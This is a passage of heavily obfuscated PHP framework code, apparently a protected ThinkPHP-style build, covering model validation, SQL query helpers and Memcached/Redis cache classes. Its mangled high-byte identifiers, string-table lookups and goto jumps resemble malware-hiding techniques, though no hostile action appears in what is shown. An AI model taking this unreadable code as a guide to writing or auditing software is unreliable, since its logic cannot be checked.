Session::remove($fóŞ„¬šÇâ . $FƒíêÆ“À[95] . $döÀ£ÂÇ–·); } return !1; } return !0; } public function regex($BĞ˜…½Œ­, $B°»ìê‚–˜) { $AäÍ¥Ã†Ğá =& $_SERVER[›èö’ù¤]; $cèö‰Í¹à… = array($AäÍ¥Ã†Ğá[301] => $AäÍ¥Ã†Ğá[302], $AäÍ¥Ã†Ğá[303] => $AäÍ¥Ã†Ğá[304], $AäÍ¥Ã†Ğá[305] => $AäÍ¥Ã†Ğá[306], $AäÍ¥Ã†Ğá[307] => $AäÍ¥Ã†Ğá[308], $AäÍ¥Ã†Ğá[309] => $AäÍ¥Ã†Ğá[310], $AäÍ¥Ã†Ğá[311] => $AäÍ¥Ã†Ğá[312], $AäÍ¥Ã†Ğá[313] => $AäÍ¥Ã†Ğá[314], $AäÍ¥Ã†Ğá[288] => $AäÍ¥Ã†Ğá[315], $AäÍ¥Ã†Ğá[316] => $AäÍ¥Ã†Ğá[317]); if (isset($cèö‰Í¹à…[strtolower($B°»ìê‚–˜)])) { $B°»ìê‚–˜ = $cèö‰Í¹à…[strtolower($B°»ìê‚–˜)]; } return preg_match($B°»ìê‚–˜, $BĞ˜…½Œ­) === 1; } private function autoOperation(&$EÌôÓ”ìğ, $DåÜ®Æ–“) { $a•¢ÉÔ·¯í =& $_SERVER[›èö’ù¤]; if (!empty($this->options[$a•¢ÉÔ·¯í[318]])) { $b“†ùÜ¢Ñ = $this->options[$a•¢ÉÔ·¯í[318]]; unset($this->options[$a•¢ÉÔ·¯í[318]]); } elseif (!empty($this->_auto)) { $b“†ùÜ¢Ñ = $this->_auto; } if (isset($b“†ùÜ¢Ñ)) { foreach ($b“†ùÜ¢Ñ as $AËâ¦æ‘İÒ) { if (empty($AËâ¦æ‘İÒ[2])) { $AËâ¦æ‘İÒ[2] = THINK_MODEL_INSERT; } if ($DåÜ®Æ–“ == $AËâ¦æ‘İÒ[2] || $AËâ¦æ‘İÒ[2] == THINK_MODEL_BOTH) { switch (trim($AËâ¦æ‘İÒ[3])) { case $a•¢ÉÔ·¯í[319]: case $a•¢ÉÔ·¯í[320]: $F©ìäñĞÂ = isset($AËâ¦æ‘İÒ[4]) ? (array) $AËâ¦æ‘İÒ[4] : array(); if (isset($EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]])) { array_unshift($F©ìäñĞÂ, $EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]]); } if ($a•¢ÉÔ·¯í[319] == $AËâ¦æ‘İÒ[3]) { $EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]] = call_user_func_array($AËâ¦æ‘İÒ[1], $F©ìäñĞÂ); } else { $EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]] = call_user_func_array(array(&$this, $AËâ¦æ‘İÒ[1]), $F©ìäñĞÂ); } break; case $a•¢ÉÔ·¯í[271]: $EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]] = $EÌôÓ”ìğ[$AËâ¦æ‘İÒ[1]]; break; case $a•¢ÉÔ·¯í[321]: if ($a•¢ÉÔ·¯í[33] === $EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]]) { unset($EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]]); } break; case $a•¢ÉÔ·¯í[322]: default: $EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]] = $AËâ¦æ‘İÒ[1]; } if (!1 === $EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]]) { unset($EÌôÓ”ìğ[$AËâ¦æ‘İÒ[0]]); } } } } return $EÌôÓ”ìğ; } protected function autoValidation($dæÒô˜–ªÅ, $DÑ–ÍÑô–) { $f“‡Òêø’ =& $_SERVER[›èö’ù¤]; if (!empty($this->options[$f“‡Òêø’[323]])) { $CÂëØ¤Õ¿“ = $this->options[$f“‡Òêø’[323]]; unset($this->options[$f“‡Òêø’[323]]); } elseif (!empty($this->_validate)) { $CÂëØ¤Õ¿“ = $this->_validate; } if (isset($CÂëØ¤Õ¿“)) { if ($this->patchValidate) { $this->error = array(); } foreach ($CÂëØ¤Õ¿“ as $BŸ²Ïâ’«° => $eĞÇ’ŠçË†) { if (empty($eĞÇ’ŠçË†[5]) || $eĞÇ’ŠçË†[5] == THINK_MODEL_BOTH || $eĞÇ’ŠçË†[5] == $DÑ–ÍÑô–) { if (0 == strpos($eĞÇ’ŠçË†[2], $f“‡Òêø’[324]) && strpos($eĞÇ’ŠçË†[2], $f“‡Òêø’[325])) { $eĞÇ’ŠçË†[2] = think_lang(substr($eĞÇ’ŠçË†[2], 2, -1)); } $eĞÇ’ŠçË†[3] = isset($eĞÇ’ŠçË†[3]) ? $eĞÇ’ŠçË†[3] : THINK_EXISTS_VALIDATE; $eĞÇ’ŠçË†[4] = isset($eĞÇ’ŠçË†[4]) ? $eĞÇ’ŠçË†[4] : $f“‡Òêø’[326]; switch ($eĞÇ’ŠçË†[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($dæÒô˜–ªÅ, $eĞÇ’ŠçË†)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($f“‡Òêø’[33] != trim($dæÒô˜–ªÅ[$eĞÇ’ŠçË†[0]])) { if (!1 === $this->_validationField($dæÒô˜–ªÅ, $eĞÇ’ŠçË†)) { return !1; } } break; default: if (isset($dæÒô˜–ªÅ[$eĞÇ’ŠçË†[0]])) { if (!1 === $this->_validationField($dæÒô˜–ªÅ, $eĞÇ’ŠçË†)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($CÉòÃ›á…ì, $fÒ÷Œ¸ÖÈ») { if (!1 === $this->_validationFieldItem($CÉòÃ›á…ì, $fÒ÷Œ¸ÖÈ»)) { if ($this->patchValidate) { $this->error[$fÒ÷Œ¸ÖÈ»[0]] = $fÒ÷Œ¸ÖÈ»[2]; } else { $this->error = $fÒ÷Œ¸ÖÈ»[2]; return !1; } } return; } protected function _validationFieldItem($DëÈƒÜ¹ƒæ, $Bªí™´¤×È) { $a¦™ñÇ˜²Š =& $_SERVER[›èö’ù¤]; switch (strtolower(trim($Bªí™´¤×È[4]))) { case $a¦™ñÇ˜²Š[319]: case $a¦™ñÇ˜²Š[320]: $eä…“ÚÚğ¾ = isset($Bªí™´¤×È[6]) ? (array) $Bªí™´¤×È[6] : array(); if (is_string($Bªí™´¤×È[0]) && strpos($Bªí™´¤×È[0], $a¦™ñÇ˜²Š[47])) { $Bªí™´¤×È[0] = explode($a¦™ñÇ˜²Š[47], $Bªí™´¤×È[0]); } if (is_array($Bªí™´¤×È[0])) { foreach ($Bªí™´¤×È[0] as $bö²ÕõÉ¶®) { $A¿²²ê“ÊÀ[$bö²ÕõÉ¶®] = $DëÈƒÜ¹ƒæ[$bö²ÕõÉ¶®]; } array_unshift($eä…“ÚÚğ¾, $A¿²²ê“ÊÀ); } else { array_unshift($eä…“ÚÚğ¾, $DëÈƒÜ¹ƒæ[$Bªí™´¤×È[0]]); } if ($a¦™ñÇ˜²Š[319] == $Bªí™´¤×È[4]) { return call_user_func_array($Bªí™´¤×È[1], $eä…“ÚÚğ¾); } else { return call_user_func_array(array(&$this, $Bªí™´¤×È[1]), $eä…“ÚÚğ¾); } case $a¦™ñÇ˜²Š[327]: return $DëÈƒÜ¹ƒæ[$Bªí™´¤×È[0]] == $DëÈƒÜ¹ƒæ[$Bªí™´¤×È[1]]; case $a¦™ñÇ˜²Š[328]: if (is_string($Bªí™´¤×È[0]) && strpos($Bªí™´¤×È[0], $a¦™ñÇ˜²Š[47])) { $Bªí™´¤×È[0] = explode($a¦™ñÇ˜²Š[47], $Bªí™´¤×È[0]); } $dä¸£œ•ËÑ = array(); if (is_array($Bªí™´¤×È[0])) { foreach ($Bªí™´¤×È[0] as $bö²ÕõÉ¶®) { $dä¸£œ•ËÑ[$bö²ÕõÉ¶®] = $DëÈƒÜ¹ƒæ[$bö²ÕõÉ¶®]; } } else { $dä¸£œ•ËÑ[$Bªí™´¤×È[0]] = $DëÈƒÜ¹ƒæ[$Bªí™´¤×È[0]]; } if (!empty($DëÈƒÜ¹ƒæ[$this->getPk()])) { $dä¸£œ•ËÑ[$this->getPk()] = array($a¦™ñÇ˜²Š[329], $DëÈƒÜ¹ƒæ[$this->getPk()]); } if ($this->where($dä¸£œ•ËÑ)->find()) { return !1; } return !0; default: return $this->check($DëÈƒÜ¹ƒæ[$Bªí™´¤×È[0]], $Bªí™´¤×È[1], $Bªí™´¤×È[4]); } } public function check($F­ƒö®‰ƒÚ, $bÌ…ğÓ¾£, $bˆˆ—Èß = "\x72\x65\x67\145\170") { $F¾Š¹©¶õ© =& $_SERVER[›èö’ù¤]; $bˆˆ—Èß = strtolower(trim($bˆˆ—Èß)); switch ($bˆˆ—Èß) { case $F¾Š¹©¶õ©[7]: case $F¾Š¹©¶õ©[330]: $aç‘…«ÒŞ¦ = is_array($bÌ…ğÓ¾£) ? $bÌ…ğÓ¾£ : explode($F¾Š¹©¶õ©[47], $bÌ…ğÓ¾£); return $bˆˆ—Èß == $F¾Š¹©¶õ©[7] ? in_array($F­ƒö®‰ƒÚ, $aç‘…«ÒŞ¦) : !in_array($F­ƒö®‰ƒÚ, $aç‘…«ÒŞ¦); case $F¾Š¹©¶õ©[331]: case $F¾Š¹©¶õ©[332]: if (is_array($bÌ…ğÓ¾£)) { $E”ÂÒ÷ ±  = $bÌ…ğÓ¾£[0]; $a¥ÀŒ†Ä™ = $bÌ…ğÓ¾£[1]; } else { list($E”ÂÒ÷ ± , $a¥ÀŒ†Ä™) = explode($F¾Š¹©¶õ©[47], $bÌ…ğÓ¾£); } return $bˆˆ—Èß == $F¾Š¹©¶õ©[331] ? $F­ƒö®‰ƒÚ >= $E”ÂÒ÷ ±  && $F­ƒö®‰ƒÚ <= $a¥ÀŒ†Ä™ : $F­ƒö®‰ƒÚ < $E”ÂÒ÷ ±  || $F­ƒö®‰ƒÚ > $a¥ÀŒ†Ä™; case $F¾Š¹©¶õ©[333]: case $F¾Š¹©¶õ©[334]: return $bˆˆ—Èß == $F¾Š¹©¶õ©[333] ? $F­ƒö®‰ƒÚ == $bÌ…ğÓ¾£ : $F­ƒö®‰ƒÚ != $bÌ…ğÓ¾£; case $F¾Š¹©¶õ©[335]: $d¡õÓ‹×Ì‘ = mb_strlen($F­ƒö®‰ƒÚ, $F¾Š¹©¶õ©[336]); if (strpos($bÌ…ğÓ¾£, $F¾Š¹©¶õ©[47])) { list($E”ÂÒ÷ ± , $a¥ÀŒ†Ä™) = explode($F¾Š¹©¶õ©[47], $bÌ…ğÓ¾£); return $d¡õÓ‹×Ì‘ >= $E”ÂÒ÷ ±  && $d¡õÓ‹×Ì‘ <= $a¥ÀŒ†Ä™; } else { return $d¡õÓ‹×Ì‘ == $bÌ…ğÓ¾£; } case $F¾Š¹©¶õ©[337]: list($DĞõ³¿»«„, $bš•˜•Îİá) = explode($F¾Š¹©¶õ©[47], $bÌ…ğÓ¾£); if (!is_numeric($DĞõ³¿»«„)) { $DĞõ³¿»«„ = strtotime($DĞõ³¿»«„); } if (!is_numeric($bš•˜•Îİá)) { $bš•˜•Îİá = strtotime($bš•˜•Îİá); } return NOW_TIME >= $DĞõ³¿»«„ && NOW_TIME <= $bš•˜•Îİá; case $F¾Š¹©¶õ©[338]: return in_array(get_client_ip(), explode($F¾Š¹©¶õ©[47], $bÌ…ğÓ¾£)); case $F¾Š¹©¶õ©[339]: return !in_array(get_client_ip(), explode($F¾Š¹©¶õ©[47], $bÌ…ğÓ¾£)); case $F¾Š¹©¶õ©[326]: default: return $this->regex($F­ƒö®‰ƒÚ, $bÌ…ğÓ¾£); } } public function query($DÒ¨ÛéšÊ, $aíŒšÉ¹Ó = false) { $fˆŸï‡Èç« =& $_SERVER[›èö’ù¤]; if (!is_bool($aíŒšÉ¹Ó) && !is_array($aíŒšÉ¹Ó)) { $aíŒšÉ¹Ó = func_get_args(); array_shift($aíŒšÉ¹Ó); } $DÒ¨ÛéšÊ = str_replace(array($fˆŸï‡Èç«[229], $fˆŸï‡Èç«[340]), $fˆŸï‡Èç«[50], $DÒ¨ÛéšÊ); $DÒ¨ÛéšÊ = $this->parseSql($DÒ¨ÛéšÊ, $aíŒšÉ¹Ó); return $this->db->query($DÒ¨ÛéšÊ); } public function execute($D·À¨Ù‚Àæ, $D‹â…óàÚ = false) { if (!is_bool($D‹â…óàÚ) && !is_array($D‹â…óàÚ)) { $D‹â…óàÚ = func_get_args(); array_shift($D‹â…óàÚ); } $D·À¨Ù‚Àæ = $this->parseSql($D·À¨Ù‚Àæ, $D‹â…óàÚ); return $this->db->execute($D·À¨Ù‚Àæ); } protected function parseSql($dßÚô‚Á, $Dˆ™ÊğéÂ«) { $bÊ¯õÕÁä =& $_SERVER[›èö’ù¤]; if (!0 === $Dˆ™ÊğéÂ«) { $BŠÕŠ§¸ãõ = $this->_parseOptions(); $dßÚô‚Á = $this->db->parseSql($dßÚô‚Á, $BŠÕŠ§¸ãõ); } elseif (is_array($Dˆ™ÊğéÂ«)) { $Dˆ™ÊğéÂ« = array_map(array($this->db, $bÊ¯õÕÁä[341]), $Dˆ™ÊğéÂ«); $dßÚô‚Á = vsprintf($dßÚô‚Á, $Dˆ™ÊğéÂ«); } else { $dßÚô‚Á = strtr($dßÚô‚Á, array($bÊ¯õÕÁä[342] => $this->getTableName(), $bÊ¯õÕÁä[343] => think_config($bÊ¯õÕÁä[242]))); } $this->db->setModel($this->name); return $dßÚô‚Á; } public function db($DŞ¥‘÷Ğë’ = '', $CÛ¶ºô©™³ = '', $CÓ¶©æÕÔ‚ = array()) { goto C•³‚’¶“¿; e²³´ÂŒ¶˜: static $bÃÏæäí†‘ = array(); if (!isset($bÃÏæäí†‘[$DŞ¥‘÷Ğë’]) || isset($bÃÏæäí†‘[$DŞ¥‘÷Ğë’]) && $CÛ¶ºô©™³ && $FĞÄ°ÊË÷‡[$DŞ¥‘÷Ğë’] != $CÛ¶ºô©™³) { if (!empty($CÛ¶ºô©™³) && is_string($CÛ¶ºô©™³) && !1 === strpos($CÛ¶ºô©™³, $d¬ñ­™ºî[8])) { $CÛ¶ºô©™³ = think_config($CÛ¶ºô©™³); } $bÃÏæäí†‘[$DŞ¥‘÷Ğë’] = Db::getInstance($CÛ¶ºô©™³); } elseif (NULL === $CÛ¶ºô©™³) { $bÃÏæäí†‘[$DŞ¥‘÷Ğë’]->close(); unset($bÃÏæäí†‘[$DŞ¥‘÷Ğë’]); return; } if (!empty($CÓ¶©æÕÔ‚)) { if (is_string($CÓ¶©æÕÔ‚)) { parse_str($CÓ¶©æÕÔ‚, $CÓ¶©æÕÔ‚); } foreach ($CÓ¶©æÕÔ‚ as $C£¡¿¦õ« => $f¤Äå×¶µ¾) { $this->setProperty($C£¡¿¦õ«, $f¤Äå×¶µ¾); } } goto Bö§ì…®Ğ§; C•³‚’¶“¿: $d¬ñ­™ºî =& $_SERVER[›èö’ù¤]; if ($d¬ñ­™ºî[33] === $DŞ¥‘÷Ğë’ && $this->db) { return $this->db; } static $FĞÄ°ÊË÷‡ = array(); goto e²³´ÂŒ¶˜; Bö§ì…®Ğ§: $FĞÄ°ÊË÷‡[$DŞ¥‘÷Ğë’] = $CÛ¶ºô©™³; $this->db = $bÃÏæäí†‘[$DŞ¥‘÷Ğë’]; $this->_after_db(); goto b·Ì“ç§İŠ; b·Ì“ç§İŠ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f™ÏÕ¾„Ó; f™ÏÕ¾„Ó: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $D¸ÆÈ¿Ø = get_class($this); if ($D¸ÆÈ¿Ø == $_SERVER[›èö’ù¤][344]) { return $this->name; } $this->name = substr($D¸ÆÈ¿Ø, 0, -5); } return $this->name; } public function getTableName() { $fƒ¸ƒ„¾àê =& $_SERVER[›èö’ù¤]; if (empty($this->trueTableName)) { $aˆ£äÚÂø£ = !empty($this->tablePrefix) ? $this->tablePrefix : $fƒ¸ƒ„¾àê[33]; if (!empty($this->tableName)) { $aˆ£äÚÂø£ .= $this->tableName; } else { $aˆ£äÚÂø£ .= think_parse_name($this->name); } $this->trueTableName = strtolower($aˆ£äÚÂø£); } return (!empty($this->dbName) ? $this->dbName . $fƒ¸ƒ„¾àê[95] : $fƒ¸ƒ„¾àê[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $f“Ê‘ğŠ´â =& $_SERVER[›èö’ù¤]; return isset($this->fields[$f“Ê‘ğŠ´â[249]]) ? $this->fields[$f“Ê‘ğŠ´â[249]] : $this->pk; } public function getDbFields() { $cÅÚÀá·Ì =& $_SERVER[›èö’ù¤]; if (isset($this->options[$cÅÚÀá·Ì[277]])) { $B½³ì«Œ³† = $this->db->getFields($this->options[$cÅÚÀá·Ì[277]]); return $B½³ì«Œ³† ? array_keys($B½³ì«Œ³†) : !1; } if ($this->fields) { $B½³ì«Œ³† = $this->fields; unset($B½³ì«Œ³†[$cÅÚÀá·Ì[248]], $B½³ì«Œ³†[$cÅÚÀá·Ì[249]], $B½³ì«Œ³†[$cÅÚÀá·Ì[250]], $B½³ì«Œ³†[$cÅÚÀá·Ì[247]]); return $B½³ì«Œ³†; } return !1; } public function data($B’óæëàĞç = '') { $c ™ö™íÁ² =& $_SERVER[›èö’ù¤]; if ($c ™ö™íÁ²[33] === $B’óæëàĞç && !empty($this->data)) { return $this->data; } if (is_object($B’óæëàĞç)) { $B’óæëàĞç = get_object_vars($B’óæëàĞç); } elseif (is_string($B’óæëàĞç)) { parse_str($B’óæëàĞç, $B’óæëàĞç); } elseif (!is_array($B’óæëàĞç)) { think_exception(think_lang($c ™ö™íÁ²[269])); } $this->data = $B’óæëàĞç; return $this; } public function join($aŸ¨‡—¥ãë) { $A»’†×±÷¨ =& $_SERVER[›èö’ù¤]; if (is_array($aŸ¨‡—¥ãë)) { $this->options[$A»’†×±÷¨[280]] = $aŸ¨‡—¥ãë; } elseif (!empty($aŸ¨‡—¥ãë)) { $this->options[$A»’†×±÷¨[280]][] = $aŸ¨‡—¥ãë; } return $this; } public function union($b‚ğîÔ÷’, $a°ÙÊñÊ¹Â = false) { goto cñ˜Ïà°ìÇ; aÚ…µ‰¨–: return $this; goto a¢‡è¯ÎÊ¢; cñ˜Ïà°ìÇ: $eÖ©åì‰Â· =& $_SERVER[›èö’ù¤]; if (empty($b‚ğîÔ÷’)) { return $this; } if ($a°ÙÊñÊ¹Â) { $this->options[$eÖ©åì‰Â·[345]][$eÖ©åì‰Â·[346]] = !0; } goto AÃÎğ·¢Ä‘; AÃÎğ·¢Ä‘: if (is_object($b‚ğîÔ÷’)) { $b‚ğîÔ÷’ = get_object_vars($b‚ğîÔ÷’); } if (is_string($b‚ğîÔ÷’)) { $dšÇ±Ùğ‹ = $b‚ğîÔ÷’; } elseif (is_array($b‚ğîÔ÷’)) { if (isset($b‚ğîÔ÷’[0])) { $this->options[$eÖ©åì‰Â·[345]] = array_merge($this->options[$eÖ©åì‰Â·[345]], $b‚ğîÔ÷’); return $this; } else { $dšÇ±Ùğ‹ = $b‚ğîÔ÷’; } } else { think_exception(think_lang($eÖ©åì‰Â·[269])); } $this->options[$eÖ©åì‰Â·[345]][] = $dšÇ±Ùğ‹; goto aÚ…µ‰¨–; a¢‡è¯ÎÊ¢: } public function cache($fÍ‹·ÂŸá¨ = true, $dÓ•ª”í¿ = null, $c·¦Ã»‰’õ = '') { $FáîÄ†—ùÓ =& $_SERVER[›èö’ù¤]; if (!1 !== $fÍ‹·ÂŸá¨) { $this->options[$FáîÄ†—ùÓ[347]] = array($FáîÄ†—ùÓ[93] => $fÍ‹·ÂŸá¨, $FáîÄ†—ùÓ[337] => $dÓ•ª”í¿, $FáîÄ†—ùÓ[29] => $c·¦Ã»‰’õ); } return $this; } public function field($dÍ¯¤å£È, $EØ¯åöê—õ = false) { $EåÃ÷¾œÚ =& $_SERVER[›èö’ù¤]; if (!0 === $dÍ¯¤å£È) { $DŞÃö’³ä = $this->getDbFields(); $dÍ¯¤å£È = $DŞÃö’³ä ? $DŞÃö’³ä : $EåÃ÷¾œÚ[182]; } elseif ($EØ¯åöê—õ) { if (is_string($dÍ¯¤å£È)) { $dÍ¯¤å£È = explode($EåÃ÷¾œÚ[47], $dÍ¯¤å£È); } $DŞÃö’³ä = $this->getDbFields(); $dÍ¯¤å£È = $DŞÃö’³ä ? array_diff($DŞÃö’³ä, $dÍ¯¤å£È) : $dÍ¯¤å£È; } $this->options[$EåÃ÷¾œÚ[271]] = $dÍ¯¤å£È; return $this; } public function scope($cÉéÅ¸ÈèÌ = '', $D£â­îİ¹À = NULL) { $fÎ÷µÅ‘²Å =& $_SERVER[›èö’ù¤]; if ($fÎ÷µÅ‘²Å[33] === $cÉéÅ¸ÈèÌ) { if (isset($this->_scope[$fÎ÷µÅ‘²Å[34]])) { $D—íàš‚‹ = $this->_scope[$fÎ÷µÅ‘²Å[34]]; } else { return $this; } } elseif (is_string($cÉéÅ¸ÈèÌ)) { $Cƒ­íœ¨ˆµ = explode($fÎ÷µÅ‘²Å[47], $cÉéÅ¸ÈèÌ); $D—íàš‚‹ = array(); foreach ($Cƒ­íœ¨ˆµ as $BÂ´ßÏ÷®‚) { if (!isset($this->_scope[$BÂ´ßÏ÷®‚])) { continue; } $D—íàš‚‹ = array_merge($D—íàš‚‹, $this->_scope[$BÂ´ßÏ÷®‚]); } if (!empty($D£â­îİ¹À) && is_array($D£â­îİ¹À)) { $D—íàš‚‹ = array_merge($D—íàš‚‹, $D£â­îİ¹À); } } elseif (is_array($cÉéÅ¸ÈèÌ)) { $D—íàš‚‹ = $cÉéÅ¸ÈèÌ; } if (is_array($D—íàš‚‹) && !empty($D—íàš‚‹)) { $this->options = array_merge($this->options, array_change_key_case($D—íàš‚‹)); } return $this; } public function where($e¶·ÖĞÇ, $b’›®µ»Êâ = null) { $e÷å±Œ¢‰ =& $_SERVER[›èö’ù¤]; if (!is_null($b’›®µ»Êâ) && is_string($e¶·ÖĞÇ)) { if (!is_array($b’›®µ»Êâ)) { $b’›®µ»Êâ = func_get_args(); array_shift($b’›®µ»Êâ); } $b’›®µ»Êâ = array_map(array($this->db, $e÷å±Œ¢‰[341]), $b’›®µ»Êâ); $e¶·ÖĞÇ = vsprintf($e¶·ÖĞÇ, $b’›®µ»Êâ); } elseif (is_object($e¶·ÖĞÇ)) { $e¶·ÖĞÇ = get_object_vars($e¶·ÖĞÇ); } elseif (is_array($e¶·ÖĞÇ)) { foreach ($e¶·ÖĞÇ as $c´˜·¨íßë => $Aí²ÖŠ’Âô) { if ((is_numeric($c´˜·¨íßë) || !$c´˜·¨íßë) && is_string($Aí²ÖŠ’Âô)) { if (strpos($Aí²ÖŠ’Âô, $e÷å±Œ¢‰[348]) === 0) { continue; } think_trace($e÷å±Œ¢‰[349], $e÷å±Œ¢‰[33], $e÷å±Œ¢‰[46]); die; } } } if (is_string($e¶·ÖĞÇ) && $e÷å±Œ¢‰[33] != $e¶·ÖĞÇ) { $Aô—®´ÕÎ = array(); $Aô—®´ÕÎ[$e÷å±Œ¢‰[350]] = $e¶·ÖĞÇ; $e¶·ÖĞÇ = $Aô—®´ÕÎ; } if (isset($this->options[$e÷å±Œ¢‰[273]])) { $this->options[$e÷å±Œ¢‰[273]] = array_merge($this->options[$e÷å±Œ¢‰[273]], $e¶·ÖĞÇ); } else { $this->options[$e÷å±Œ¢‰[273]] = $e¶·ÖĞÇ; } return $this; } public function limit($EšÎ×‚¸¤Ä, $E–™Î÷³ØŒ = null) { $bÑã£É‘À =& $_SERVER[›èö’ù¤]; $this->options[$bÑã£É‘À[290]] = is_null($E–™Î÷³ØŒ) ? $EšÎ×‚¸¤Ä : $EšÎ×‚¸¤Ä . $bÑã£É‘À[47] . $E–™Î÷³ØŒ; return $this; } public function page($A¬ÌˆÊ¤¬È, $b´îÆô•¶Ì = null) { $f¦¶Â¾–ù× =& $_SERVER[›èö’ù¤]; $this->options[$f¦¶Â¾–ù×[351]] = is_null($b´îÆô•¶Ì) ? $A¬ÌˆÊ¤¬È : $A¬ÌˆÊ¤¬È . $f¦¶Â¾–ù×[47] . $b´îÆô•¶Ì; return $this; } public function comment($dÇ¸å¸Ê÷Â) { $this->options[$_SERVER[›èö’ù¤][352]] = $dÇ¸å¸Ê÷Â; return $this; } public function setProperty($CË•‚²©Ö, $cºù¨ìÆ÷¹) { if (property_exists($this, $CË•‚²©Ö)) { $this->{$CË•‚²©Ö} = $cºù¨ìÆ÷¹; } return $this; } } goto Eêñ ï‚ø; cƒ†¥‹¥ƒ­: class CacheMemcached { public $handle; public $cacheTime; public function __construct($BÏƒ÷™¾ßå, $e§¢ØäÑô) { $fÍŒªóÅ‹ğ =& $_SERVER[›èö’ù¤]; if (!class_exists($fÍŒªóÅ‹ğ[854])) { show_json($fÍŒªóÅ‹ğ[855], !1); } $this->cacheTime = $e§¢ØäÑô; $this->handle = new Memcached(); if (is_array($BÏƒ÷™¾ßå[$fÍŒªóÅ‹ğ[856]]) && count($BÏƒ÷™¾ßå[$fÍŒªóÅ‹ğ[856]]) >= 1) { foreach ($BÏƒ÷™¾ßå[$fÍŒªóÅ‹ğ[856]] as $a×¼®ĞÇÉ) { $cƒë´º‰ŒŠ = explode($fÍŒªóÅ‹ğ[4], $a×¼®ĞÇÉ); $this->handle->addServer($cƒë´º‰ŒŠ[0], $cƒë´º‰ŒŠ[1]); } } else { $this->handle->addServer($BÏƒ÷™¾ßå[$fÍŒªóÅ‹ğ[175]], $BÏƒ÷™¾ßå[$fÍŒªóÅ‹ğ[176]]); } } public function set($dÁÆ‹Æ¦ªÉ, $Fœ³»‘™‚, $d¾‹èÍ³ÃÀ = false) { $d¾‹èÍ³ÃÀ = $d¾‹èÍ³ÃÀ ? $d¾‹èÍ³ÃÀ : $this->cacheTime; return $this->handle->set($dÁÆ‹Æ¦ªÉ, $Fœ³»‘™‚, $d¾‹èÍ³ÃÀ); } public function get($b†¾øÂÏ‘) { return $this->handle->get($b†¾øÂÏ‘); } public function remove($BÎÁ±­í°) { return $this->handle->delete($BÎÁ±­í°); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($aÇÏæŒŸòÃ, $Fˆõ®„Œ‘) { $aºÛ·ò¦½“ =& $_SERVER[›èö’ù¤]; if (!class_exists($aºÛ·ò¦½“[857])) { show_json($aºÛ·ò¦½“[858], !1); } $this->cacheTime = $Fˆõ®„Œ‘; $BÂŞã©è Ë = isset($aÇÏæŒŸòÃ[$aºÛ·ò¦½“[859]]) ? $aÇÏæŒŸòÃ[$aºÛ·ò¦½“[859]] : 10; $AÕ¤ã±¿‘ñ = _get($aÇÏæŒŸòÃ, $aºÛ·ò¦½“[856]); if ($AÕ¤ã±¿‘ñ && is_array($AÕ¤ã±¿‘ñ)) { $this->initCluster($aÇÏæŒŸòÃ, $BÂŞã©è Ë); } else { $this->handle = $this->init($aÇÏæŒŸòÃ, $BÂŞã©è Ë); } } private function init($d¬¤‹ß©, $b¼¹¿©¿Îº) { $fÛ­ôŸËè =& $_SERVER[›èö’ù¤]; $e¥¸ñ‹¼ò = new Redis(); $F›Ø‰Ü©Å• = isset($d¬¤‹ß©[$fÛ­ôŸËè[860]]) ? $d¬¤‹ß©[$fÛ­ôŸËè[860]] : !1; if ($F›Ø‰Ü©Å•) { $e¥¸ñ‹¼ò->pconnect($d¬¤‹ß©[$fÛ­ôŸËè[175]], $d¬¤‹ß©[$fÛ­ôŸËè[176]], $b¼¹¿©¿Îº); } else { $e¥¸ñ‹¼ò->connect($d¬¤‹ß©[$fÛ­ôŸËè[175]], $d¬¤‹ß©[$fÛ­ôŸËè[176]], $b¼¹¿©¿Îº); } if (!empty($d¬¤‹ß©[$fÛ­ôŸËè[408]])) { $e¥¸ñ‹¼ò->auth($d¬¤‹ß©[$fÛ­ôŸËè[408]]); } return $e¥¸ñ‹¼ò; } private function initCluster($b§š¡¶°’Õ, $F˜ËñÂ…) { $f²Îéö˜¡¬ =& $_SERVER[›èö’ù¤]; $Eº‚²ñ•© = array($f²Îéö˜¡¬[861], $f²Îéö˜¡¬[862], $f²Îéö˜¡¬[863]); $fùßñƒ„©æ = $f²Îéö˜¡¬[861]; if (isset($b§š¡¶°’Õ[$f²Îéö˜¡¬[12]]) && in_array($b§š¡¶°’Õ[$f²Îéö˜¡¬[12]], $Eº‚²ñ•©)) { $fùßñƒ„©æ = $b§š¡¶°’Õ[$f²Îéö˜¡¬[12]]; } switch ($fùßñƒ„©æ) { case $f²Îéö˜¡¬[861]: $this->_slave($b§š¡¶°’Õ, $F˜ËñÂ…); break; case $f²Îéö˜¡¬[862]: break; case $f²Îéö˜¡¬[863]: $this->isCluster = !0; $AÏ‹‚¬ò¥” = $b§š¡¶°’Õ[$f²Îéö˜¡¬[856]]; $B¿„«—ÙØ = isset($b§š¡¶°’Õ[$f²Îéö˜¡¬[860]]) ? $b§š¡¶°’Õ[$f²Îéö˜¡¬[860]] : !1; $Dàó»¼Ÿ²‹ = isset($b§š¡¶°’Õ[$f²Îéö˜¡¬[408]]) ? $b§š¡¶°’Õ[$f²Îéö˜¡¬[408]] : null; $this->handle = new RedisCluster(NUll, $AÏ‹‚¬ò¥”, $F˜ËñÂ…, $F˜ËñÂ…, $B¿„«—ÙØ, $Dàó»¼Ÿ²‹); break; default: break; } } private function 